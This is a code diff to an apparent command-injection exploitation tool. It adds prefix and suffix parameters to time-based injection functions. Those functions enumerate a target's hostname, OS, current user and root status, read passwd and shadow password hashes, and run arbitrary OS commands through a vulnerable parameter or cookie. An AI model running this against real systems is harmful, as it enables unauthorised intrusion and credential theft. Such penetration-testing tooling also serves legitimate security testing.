@@ -32,9 +32,9 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_in
 """
 Hostname enumeration
 """
-def hostname(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   cmd = settings.HOSTNAME
-  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   shell = output 
   if shell:
     shell = "".join(str(p) for p in output)
@@ -45,15 +45,15 @@ def hostname(separator, maxlen, TAG, delay, http_request_method, url, vuln_param
 """
 Retrieve system information
 """
-def system_information(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):  
+def system_information(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):  
   cmd = settings.RECOGNISE_OS            
-  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   target_os = output
   if target_os:
     target_os = "".join(str(p) for p in output)
     if target_os == "Linux":
       cmd = settings.RECOGNISE_HP
-      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
       target_arch = output
       if target_arch:
         target_arch = "".join(str(p) for p in target_arch)
@@ -68,21 +68,21 @@ def system_information(separator, maxlen, TAG, delay, http_request_method, url, 
 """
 The current user enumeration
 """
-def current_user(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   cmd = settings.CURRENT_USER
   if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
     # Check if target host is vulnerable to cookie injection.
     vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie) 
-    check_how_long, output  = tfb_injector.cookie_injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.cookie_injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   else:
-    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   cu_account = output
   if cu_account:
     cu_account = "".join(str(p) for p in output)
     # Check if the user have super privilleges.
     if menu.options.is_root:
       cmd = settings.ISROOT
-      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+      check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
       is_root = output
       if is_root:
         sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
@@ -100,11 +100,11 @@ def current_user(separator, maxlen, TAG, delay, http_request_method, url, vuln_p
 """
 System users enumeration
 """
-def system_users(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell): 
+def system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell): 
   sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
   sys.stdout.flush()
   cmd = settings.SYS_USERS             
-  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   sys_users = output
   if sys_users :
     sys_users = "".join(str(p) for p in sys_users)
@@ -142,11 +142,11 @@ def system_users(separator, maxlen, TAG, delay, http_request_method, url, vuln_p
 """
 System passwords enumeration
 """
-def system_passwords(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell): 
+def system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell): 
   sys.stdout.write("\n(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
   sys.stdout.flush()
   cmd = settings.SYS_PASSES            
-  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   sys_passes = output
   if sys_passes :
     sys_passes = "".join(str(p) for p in sys_passes)
@@ -168,9 +168,9 @@ def system_passwords(separator, maxlen, TAG, delay, http_request_method, url, vu
 """
 Single os-shell execution
 """
-def single_os_cmd_exec(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def single_os_cmd_exec(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   cmd =  menu.options.os_cmd
-  check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+  check_how_long,output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
   shell = output
   if shell:
     if menu.options.verbose:
@@ -180,20 +180,20 @@ def single_os_cmd_exec(separator, maxlen, TAG, delay, http_request_method, url, 
     sys.exit(0)
 
 
-def do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
+def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   if menu.options.hostname:
-    hostname(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
   if menu.options.current_user:
-    current_user(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
   if menu.options.sys_info:
-    system_information(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    system_information(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
   if menu.options.users:
-    system_users(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
   if menu.options.passwords:
-    system_passwords(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+    system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
 
 # eof
